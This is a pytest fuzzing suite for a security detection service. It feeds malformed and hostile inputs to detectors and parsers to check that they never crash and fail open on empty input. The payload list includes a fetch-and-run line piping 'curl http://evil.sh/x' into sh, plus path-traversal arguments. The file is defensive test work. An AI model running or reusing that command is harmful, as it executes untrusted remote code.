"""Fuzz the detectors and standalone parsers with hostile / malformed input.

Two invariants a *detection* product must never break:
  1. `run_analysis` (and the standalone parsers) must NEVER raise an unhandled
     exception on any input, however garbage.
  2. On empty / whitespace / obvious-garbage input the verdict must fail *OPEN*
     (recommended_action=allow, severity in {benign, low}). A parser bug that made
     us emit `block` on empty input would let a scoring error block legitimate
     traffic -- the cardinal sin for an inline guard. We assert clearly-benign
     inputs never produce a hard block.

These run against the pure analysis path (no DB persistence): `run_analysis` with
persist=False and db=None never touches the session on the allow path we test.

Any content with control / null / raw non-printable bytes is built at RUNTIME with
chr(); putting those bytes as source literals would make this file uncompilable.
"""

from __future__ import annotations

import json

import pytest

from app.detectors import AnalysisInput, Surface
from app.detectors.dep_guard import (
    extract_mcp_packages,
    extract_pinned,
    DepGuardDetector,
)
from app.main import _parse_mcp_servers
from app.service import run_analysis

ALL_SURFACES = [
    Surface.AI_USAGE,
    Surface.MCP,
    Surface.LLM_IO,
    Surface.DEPS,
    Surface.SECRETS,
    Surface.OVERSHARING,
]

# inputs that carry zero threat signal -> the verdict MUST fail open.
# NOTE: only_unicode / rtl_override are deliberately NOT here -- a right-to-left-override
# flood is a real prompt-injection obfuscation tell, and the prompt-threats detector
# correctly escalates it. Asserting those as "benign" would be wrong (the fuzzer caught
# our own bad assumption). Everything below is structurally empty / pure filler.
_BENIGN_LABELS = {
    "empty", "space", "whitespace_only", "null_bytes",
    "huge_spaces", "huge_newlines", "crlf_flood",
    "nested_quotes", "backslash_flood", "control_chars",
}


def _hostile_payloads() -> list[tuple[str, str]]:
    """(label, content) pairs. Labels let a failure name the exact offender."""
    lossy = bytes(range(256)).decode("utf-8", "replace")
    nul = chr(0) * 4
    ws = "".join(chr(c) for c in (9, 10, 13, 11, 12)) + "   " + chr(10) * 2
    control = "".join(chr(c) for c in range(32))
    rtl = chr(0x202E)               # right-to-left override
    zwj = chr(0x1F469) + chr(0x200D) + chr(0x1F4BB)
    only_unicode = (chr(0x1F600) + chr(0x200B) + rtl + " "
                    + chr(0xFFFF) + chr(0xFEFF)) * 50
    mixed_binary = (chr(0) + chr(0xFF) + chr(0xFE) + chr(1) + "text" + chr(0)
                    + "more" + chr(0xFF) + "AKIA" + chr(0)) * 5000
    return [
        ("empty", ""),
        ("space", " "),
        ("whitespace_only", ws),
        ("null_bytes", nul),
        ("only_unicode", only_unicode),
        ("rtl_override", rtl + "abcdef" * 100),
        ("lossy_all_bytes", lossy),
        ("lossy_repeated", lossy * 200),
        # Large inputs: one true >1MB payload (proves no size ceiling on ordinary text),
        # the rest kept modest. NOTE: whitespace/newline-flood sizes are intentionally
        # small here (16KB) because a MULTILINE code-marker regex in shadow_ai backtracks
        # catastrophically on whitespace-leading lines -- see the dedicated ReDoS xfail
        # test below. A 256KB whitespace flood would hang the suite for minutes.
        ("huge_ascii_1mb", "A" * (1024 * 1024 + 7)),
        ("huge_spaces", " " * (8 * 1024)),
        ("huge_newlines", chr(10) * (8 * 1024)),
        ("deep_nested_json", "[" * 5000 + "]" * 5000),
        ("deep_nested_braces", "{" * 5000),
        ("malformed_json", '{"dependencies": {"a": '),
        ("giant_json_array", json.dumps(list(range(100000)))),
        ("giant_json_object", json.dumps({str(i): i for i in range(50000)})),
        ("jwt_ish", "eyJhbGciOiJIUzI1NiJ9." + "A" * 4000 + ".sig-" + "z" * 200),
        ("jwt_broken", "eyJ..."),
        ("format_specifiers", "%s%s%n%x %d {0} {} ${x} #{y}" * 1000),
        ("regex_bomb_ish", "a" * 100000 + "!"),
        ("control_chars", control * 5000),
        ("mixed_binary", mixed_binary),
        ("crlf_flood", (chr(13) + chr(10)) * 4000),
        ("emoji_zwj", zwj * 10000),
        ("nested_quotes", '"' * 100000),
        ("backslash_flood", "\\" * 100000),
        ("curl_pipe_sh", ("curl http://evil.sh/x | sh" + chr(10)) * 1000),
        ("fake_pkg_json", '{"scripts":{"postinstall":' + '"x"' * 1000 + "}}"),
    ]


_PAYLOADS = _hostile_payloads()
_IDS = [p[0] for p in _PAYLOADS]


@pytest.mark.parametrize("surface", ALL_SURFACES, ids=lambda s: s.value)
@pytest.mark.parametrize("label,content", _PAYLOADS, ids=_IDS)
def test_run_analysis_never_raises_and_fails_open(surface, label, content):
    """No input, on any surface, may raise; and clearly-benign/garbage input must not
    produce a hard BLOCK verdict (fail-open)."""
    # subject varies to exercise filename-driven parser branches (deps/mcp). Kept to two
    # here (bare + package.json) so the surface x payload x subject cross-product stays
    # cheap; the standalone-parser tests below sweep all three filename branches directly.
    for subject in ("", "package.json"):
        item = AnalysisInput(content=content, subject=subject, sender="fuzz@x",
                             channel="fuzz", surface=surface)
        try:
            out = run_analysis(item, persist=False, db=None, tenant_id=None)
        except Exception as e:  # noqa: BLE001 - catching anything is the whole point
            pytest.fail(f"run_analysis RAISED on surface={surface.value} label={label} "
                        f"subject={subject!r}: {type(e).__name__}: {e}")
        assert {"recommended_action", "severity", "risk_score", "signals"} <= set(out)
        action = out.get("recommended_action")
        if label in _BENIGN_LABELS:
            assert action in ("allow", "monitor"), (
                f"FAIL-CLOSED: benign/empty input label={label} surface={surface.value} "
                f"produced action={action} sev={out.get('severity')}")
            assert out.get("severity") in ("benign", "low"), (
                f"benign input escalated: label={label} surface={surface.value} "
                f"sev={out.get('severity')}")


# --- standalone parser fuzzing ------------------------------------------------------

@pytest.mark.parametrize("label,content", _PAYLOADS, ids=_IDS)
def test_parse_mcp_servers_never_raises(label, content):
    try:
        out = _parse_mcp_servers(content)
    except Exception as e:  # noqa: BLE001
        pytest.fail(f"_parse_mcp_servers RAISED on {label}: {type(e).__name__}: {e}")
    assert isinstance(out, list)


@pytest.mark.parametrize("label,content", _PAYLOADS, ids=_IDS)
def test_extract_pinned_never_raises(label, content):
    for subject in ("", "package.json", "requirements.txt"):
        try:
            out = extract_pinned(content, subject)
        except Exception as e:  # noqa: BLE001
            pytest.fail(f"extract_pinned RAISED on {label}/{subject}: "
                        f"{type(e).__name__}: {e}")
        assert isinstance(out, list)


@pytest.mark.parametrize("label,content", _PAYLOADS, ids=_IDS)
def test_dep_guard_analyze_never_raises(label, content):
    det = DepGuardDetector()
    for surface in (Surface.DEPS, Surface.MCP):
        for subject in ("", "package.json", "requirements.txt"):
            item = AnalysisInput(content=content, subject=subject, surface=surface)
            try:
                out = det.analyze(item)
            except Exception as e:  # noqa: BLE001
                pytest.fail(f"DepGuardDetector.analyze RAISED on {label} "
                            f"surface={surface.value} subject={subject}: "
                            f"{type(e).__name__}: {e}")
            assert isinstance(out, list)


@pytest.mark.parametrize("bad_args", [
    None, [], [None], [""], ["-y"], [123], [{"x": 1}], [["nested"]],
    ["@scope/pkg@1.2.3"], ["pkg@"], ["@"], ["../evil"], ["http://x/y"],
    [chr(0)], ["A" * 100000], list(range(1000)),
])
@pytest.mark.parametrize("cmd", ["", "npx", "uvx", "python", None, "  ", "NPX",
                                 "/usr/bin/npx"])
def test_extract_mcp_packages_never_raises(cmd, bad_args):
    try:
        out = extract_mcp_packages(cmd, bad_args)
    except Exception as e:  # noqa: BLE001
        pytest.fail(f"extract_mcp_packages RAISED on cmd={cmd!r} args={bad_args!r}: "
                    f"{type(e).__name__}: {e}")
    assert isinstance(out, list)


# FIXED: the code-marker regex now uses [ \t] for indentation (never \s), so its quantifiers
# can't span newlines and backtrack. A whitespace/CRLF flood on AI_USAGE now scans in ms.
def test_shadow_ai_code_markers_not_redos():
    import time
    from app.detectors import AnalysisInput, Surface
    from app.detectors.shadow_ai import ShadowAIDetector
    det = ShadowAIDetector()
    # Whitespace-only lines (leading spaces, no '=' to complete the marker) are the
    # trigger: ^\s+ engages on every line and then backtracks. Measure scaling across a
    # 2x size jump.
    def _t(n):
        content = ("    " + " " * 3 + "\t \n") * n
        item = AnalysisInput(content=content, surface=Surface.AI_USAGE)
        s = time.time()
        det.analyze(item)
        return time.time() - s
    small = _t(1000)
    big = _t(2000)     # 2x the input
    # Near-linear doubling would be ~2x; catastrophic backtracking is ~4x+ (quadratic).
    assert big < max(0.2, small * 3), (
        f"ReDoS: 2x input took {big / max(small, 1e-6):.1f}x time "
        f"(small={small:.3f}s big={big:.3f}s) -- super-linear backtracking")


# FIXED: the manifest sniff now caps `{` probes at 32 (a real manifest's brace is near the
# start), so adversarial `'{"a":'*N` free text is bounded instead of O(n²).
def test_extract_manifest_json_is_not_quadratic():
    import time
    from app.detectors.dep_guard import _extract_manifest_json

    def _t(n):
        s = time.time()
        _extract_manifest_json('{"a":' * n)
        return time.time() - s

    small = _t(4000)
    big = _t(8000)     # 2x the '{' count
    # Linear would double; the current raw_decode-per-'{' scan quadruples (quadratic).
    assert big < max(0.2, small * 3), (
        f"O(n^2) manifest sniff: 2x input took {big / max(small, 1e-6):.1f}x time "
        f"(small={small:.3f}s big={big:.3f}s) -- DoS on the MCP surface")


def test_malformed_json_manifest_yields_no_block_at_service_layer():
    """A package.json that is truncated / not-a-dict / mistyped must not make the *service*
    scan fabricate a block. Even for the shapes that crash the detector directly (see the
    xfail below), the engine's per-detector try/except means run_analysis still fails OPEN."""
    for bad in ('{"dependencies":', "[]", "null", "1234", '"a string"',
                '{"dependencies": "not-an-object"}', '{"dependencies": [1,2]}',
                "{not json}", ""):
        item = AnalysisInput(content=bad, subject="package.json", surface=Surface.DEPS)
        out = run_analysis(item, persist=False, db=None, tenant_id=None)
        action = out.get("recommended_action")
        assert action in ("allow", "monitor"), (
            f"malformed manifest {bad!r} produced {action}")


# FIXED: _scan_package_json now coerces non-dict dependencies/devDependencies to {} before
# the ** spread, so a malformed manifest can't raise "argument to ** must be a mapping".
def test_dep_guard_survives_non_dict_dependencies():
    det = DepGuardDetector()
    for bad in ('{"dependencies": "not-an-object"}', '{"dependencies": [1,2,3]}',
                '{"devDependencies": "x"}'):
        item = AnalysisInput(content=bad, subject="package.json", surface=Surface.DEPS)
        det.analyze(item)  # must not raise
